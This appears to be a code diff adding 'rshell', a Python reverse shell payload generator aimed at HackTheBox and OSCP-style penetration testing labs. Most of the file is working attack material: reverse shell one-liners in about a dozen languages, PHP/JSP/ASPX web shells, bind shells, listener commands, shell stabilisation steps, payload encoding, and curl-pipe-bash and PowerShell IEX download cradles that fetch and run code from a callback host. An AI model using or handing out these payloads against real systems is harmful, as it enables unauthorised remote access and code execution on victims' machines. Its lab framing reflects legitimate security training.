@@ -1,0 +1,269 @@
+#!/usr/bin/env python3
+import argparse
+import base64
+import os
+import re
+import shutil
+import subprocess
+import sys
+import urllib.parse
+from typing import Dict, List, Optional
+
+
+def load_dotenv(path: str = ".env") -> Dict[str, str]:
+    data: Dict[str, str] = {}
+    if not os.path.isfile(path):
+        return data
+    for line in open(path, "r", encoding="utf-8", errors="ignore"):
+        s = line.strip()
+        if not s or s.startswith("#"):
+            continue
+        if s.startswith("export "):
+            s = s[len("export "):]
+        if "=" not in s:
+            continue
+        k, v = s.split("=", 1)
+        k = k.strip()
+        v = v.strip().strip('"').strip("'")
+        data[k] = v
+    return data
+
+
+def run_cmd(cmd: List[str]) -> str:
+    try:
+        return subprocess.check_output(cmd, stderr=subprocess.DEVNULL, text=True).strip()
+    except Exception:
+        return ""
+
+
+def ip_from_iface(iface: str) -> Optional[str]:
+    out = run_cmd(["ip", "-4", "addr", "show", iface])
+    m = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)/(\d+)", out)
+    return m.group(1) if m else None
+
+
+def detect_lhost() -> Optional[str]:
+    tun = ip_from_iface("tun0")
+    if tun:
+        return tun
+
+    out = run_cmd(["ip", "-4", "-o", "addr", "show", "up"])
+    for line in out.splitlines():
+        parts = line.split()
+        if len(parts) < 4:
+            continue
+        iface = parts[1]
+        if iface == "lo":
+            continue
+        cidr = parts[3]
+        ip = cidr.split("/")[0]
+        if ip.startswith("127."):
+            continue
+        return ip
+    return None
+
+
+def colorize(text: str, code: str, use_color: bool) -> str:
+    if not use_color:
+        return text
+    return f"\033[{code}m{text}\033[0m"
+
+
+def build_templates() -> List[Dict[str, str]]:
+    return [
+        {"id": "bash", "type": "reverse", "desc": "Bash reverse shell", "tpl": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"},
+        {"id": "sh", "type": "reverse", "desc": "POSIX sh reverse shell", "tpl": "sh -i >& /dev/tcp/{lhost}/{lport} 0>&1"},
+        {"id": "nc-mkfifo", "type": "reverse", "desc": "Netcat mkfifo variant", "tpl": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"},
+        {"id": "nc-e", "type": "reverse", "desc": "Netcat -e variant", "tpl": "nc -e /bin/sh {lhost} {lport}"},
+        {"id": "ncat-e", "type": "reverse", "desc": "Ncat -e variant", "tpl": "ncat {lhost} {lport} -e /bin/bash"},
+        {"id": "socat", "type": "reverse", "desc": "Socat reverse shell", "tpl": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}"},
+        {"id": "python", "type": "reverse", "desc": "Python reverse shell", "tpl": "python -c 'import socket,os,pty;s=socket.socket();s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"},
+        {"id": "python3", "type": "reverse", "desc": "Python3 reverse shell", "tpl": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"},
+        {"id": "perl", "type": "reverse", "desc": "Perl reverse shell", "tpl": "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"},
+        {"id": "php", "type": "reverse", "desc": "PHP reverse shell", "tpl": "php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"},
+        {"id": "ruby", "type": "reverse", "desc": "Ruby reverse shell", "tpl": "ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"},
+        {"id": "awk", "type": "reverse", "desc": "Awk reverse shell", "tpl": "awk 'BEGIN {{s=\"/inet/tcp/0/{lhost}/{lport}\"; while(42){{ do{{ printf \"shell> \" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") ; close(s); }} }}' /dev/null"},
+        {"id": "lua", "type": "reverse", "desc": "Lua reverse shell", "tpl": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{lhost}','{lport}');os.execute('/bin/sh -i <&3 >&3 2>&3');\""},
+        {"id": "powershell", "type": "reverse", "desc": "PowerShell reverse shell", "tpl": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""},
+        {"id": "cmd", "type": "reverse", "desc": "Windows cmd via powershell launcher", "tpl": "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:8000/shell.ps1')\""},
+        {"id": "php-web", "type": "webshell", "desc": "Minimal PHP web shell", "tpl": "<?php if(isset($_REQUEST['cmd'])){{ system($_REQUEST['cmd']); }} ?>"},
+        {"id": "jsp-web", "type": "webshell", "desc": "Minimal JSP web shell", "tpl": "<%@ page import=\"java.io.*\" %><% String cmd=request.getParameter(\"cmd\"); if(cmd!=null){{ Process p=Runtime.getRuntime().exec(cmd); BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream())); String l; while((l=r.readLine())!=null){{ out.println(l+\"<br/>\"); }} }} %>"},
+        {"id": "aspx-web", "type": "webshell", "desc": "Minimal ASPX web shell", "tpl": "<%@ Page Language=\"C#\" %><% if(Request[\"cmd\"] != null){{ System.Diagnostics.Process p = new System.Diagnostics.Process(); p.StartInfo.FileName = \"cmd.exe\"; p.StartInfo.Arguments = \"/c \" + Request[\"cmd\"]; p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true; p.Start(); Response.Write(\"<pre>\" + p.StandardOutput.ReadToEnd() + \"</pre>\"); }} %>"},
+        {"id": "bind-bash", "type": "bind", "desc": "Bash bind shell", "tpl": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvp {lport} >/tmp/f"},
+        {"id": "bind-python3", "type": "bind", "desc": "Python3 bind shell", "tpl": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.bind((\"0.0.0.0\",{lport}));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),fd) for fd in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'"},
+    ]
+
+
+def build_listeners(lhost: str, lport: int, target: str) -> Dict[str, str]:
+    return {
+        "nc": f"nc -lvnp {lport}",
+        "rlwrap-nc": f"rlwrap -cAr nc -lvnp {lport}",
+        "ncat": f"ncat -lvnp {lport}",
+        "socat": f"socat file:`tty`,raw,echo=0 tcp-listen:{lport}",
+        "pwncat-cs": f"pwncat-cs -lp {lport}",
+        "connect-bind": f"nc -nv {target} {lport}",
+    }
+
+
+def upgrade_suggestions(lhost: str, lport: int) -> List[str]:
+    return [
+        "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+        "export TERM=xterm",
+        "stty raw -echo; fg",
+        "stty rows 50 columns 200",
+        "script /dev/null -c bash",
+        f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}",
+    ]
+
+
+def stabilization_cheatsheet() -> str:
+    return "\n".join([
+        "[TTY Upgrade Cheat Sheet]",
+        "1) python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+        "2) Ctrl-Z",
+        "3) stty raw -echo; fg",
+        "4) reset",
+        "5) export TERM=xterm-256color",
+        "6) stty rows 50 columns 200",
+    ])
+
+
+def encode_payload(payload: str, do_url: bool, do_b64: bool) -> str:
+    out = payload
+    if do_b64:
+        out = base64.b64encode(out.encode()).decode()
+    if do_url:
+        out = urllib.parse.quote(out, safe="")
+    return out
+
+
+def copy_clipboard(text: str) -> Optional[str]:
+    for cmd, args in [("xclip", ["xclip", "-selection", "clipboard"]), ("xsel", ["xsel", "--clipboard", "--input"]), ("wl-copy", ["wl-copy"])]:
+        if shutil.which(cmd):
+            try:
+                p = subprocess.Popen(args, stdin=subprocess.PIPE)
+                p.communicate(input=text.encode())
+                if p.returncode == 0:
+                    return cmd
+            except Exception:
+                pass
+    return None
+
+
+def main() -> int:
+    dotenv = load_dotenv()
+    detected_ip = detect_lhost()
+
+    parser = argparse.ArgumentParser(description="rshell: fast reverse shell helper for HTB/CPTS/OSCP workflows")
+    parser.add_argument("payload", nargs="?", help="Payload ID (use --list to see all)")
+    parser.add_argument("--target", default=dotenv.get("target", ""), help="Target host (default from .env target)")
+    parser.add_argument("--lhost", default=dotenv.get("tun0_ip") or detected_ip or "", help="Callback host (default: .env tun0_ip, then tun0/active iface)")
+    parser.add_argument("--lport", type=int, default=int(os.getenv("RSHELL_DEFAULT_PORT", "4444")), help="Callback/listener port (default: RSHELL_DEFAULT_PORT or 4444)")
+    parser.add_argument("--list", action="store_true", help="List all payload IDs")
+    parser.add_argument("--search", default="", help="Search payloads by keyword")
+    parser.add_argument("--listener", choices=["nc", "rlwrap-nc", "ncat", "socat", "pwncat-cs", "connect-bind", "all"], default="all", help="Listener command preference")
+    parser.add_argument("--quiet", action="store_true", help="Output payload only")
+    parser.add_argument("--url", action="store_true", help="URL-encode payload")
+    parser.add_argument("--b64", action="store_true", help="Base64-encode payload")
+    parser.add_argument("--copy", action="store_true", help="Copy payload to clipboard if supported")
+    parser.add_argument("--no-color", action="store_true", help="Disable ANSI colors")
+    parser.add_argument("--stabilize", action="store_true", help="Show stabilization cheat sheet and exit")
+    parser.add_argument("--cradle", choices=["bash", "powershell"], help="Generate HTTP download cradle")
+    parser.add_argument("--file", default="", help="Filename for cradle generation")
+
+    args = parser.parse_args()
+    use_color = sys.stdout.isatty() and not args.no_color and not args.quiet
+
+    if args.stabilize:
+        print(stabilization_cheatsheet())
+        return 0
+
+    if args.cradle:
+        if not args.lhost or not args.file:
+            print("[!] --cradle requires --lhost and --file", file=sys.stderr)
+            return 1
+        if args.cradle == "bash":
+            payload = f"curl -fsSL http://{args.lhost}:8000/{args.file} | bash"
+        else:
+            payload = f"powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://{args.lhost}:8000/{args.file}')\""
+        payload = encode_payload(payload, args.url, args.b64)
+        print(payload)
+        return 0
+
+    templates = build_templates()
+
+    if args.list:
+        for t in templates:
+            print(f"{t['id']:<14} {t['type']:<8} {t['desc']}")
+        return 0
+
+    if args.search:
+        q = args.search.lower()
+        for t in templates:
+            blob = f"{t['id']} {t['type']} {t['desc']}".lower()
+            if q in blob:
+                print(f"{t['id']:<14} {t['type']:<8} {t['desc']}")
+        return 0
+
+    if not args.payload:
+        parser.print_help()
+        return 1
+
+    selected = next((t for t in templates if t["id"] == args.payload), None)
+    if not selected:
+        print(f"[!] Unknown payload: {args.payload}", file=sys.stderr)
+        print("[i] Use --list to see valid payload IDs", file=sys.stderr)
+        return 1
+
+    if selected["type"] in {"reverse", "bind"} and args.lport <= 0:
+        print("[!] lport must be > 0", file=sys.stderr)
+        return 1
+
+    if selected["type"] == "reverse" and not args.lhost:
+        print("[!] lhost is required for reverse shells (set --lhost or tun0/.env)", file=sys.stderr)
+        return 1
+
+    target = args.target or "<target>"
+    raw_payload = selected["tpl"].format(lhost=args.lhost, lport=args.lport, target=target)
+    final_payload = encode_payload(raw_payload, args.url, args.b64)
+
+    if args.copy:
+        tool = copy_clipboard(final_payload)
+        if tool and not args.quiet:
+            print(colorize(f"[+] Copied payload to clipboard via {tool}", "32", use_color))
+        elif not tool and not args.quiet:
+            print(colorize("[!] Clipboard tool not found (xclip/xsel/wl-copy)", "33", use_color))
+
+    if args.quiet:
+        print(final_payload)
+        return 0
+
+    title = f"rshell | payload={selected['id']} | box={dotenv.get('box', '-') or '-'}"
+    print(colorize(title, "36", use_color))
+    print(colorize("=" * len(title), "36", use_color))
+
+    print(colorize("[Payload]", "32", use_color))
+    print(final_payload)
+    print()
+
+    listeners = build_listeners(args.lhost or "<lhost>", args.lport, target)
+
+    print(colorize("[Listener]", "32", use_color))
+    if selected["type"] == "bind":
+        print(listeners["connect-bind"])
+    elif args.listener == "all":
+        for k in ["nc", "rlwrap-nc", "ncat", "socat", "pwncat-cs"]:
+            print(f"{k:<12} {listeners[k]}")
+    else:
+        print(listeners[args.listener])
+    print()
+
+    print(colorize("[Upgrade Suggestions]", "32", use_color))
+    for s in upgrade_suggestions(args.lhost or "<lhost>", args.lport):
+        print(s)
+
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
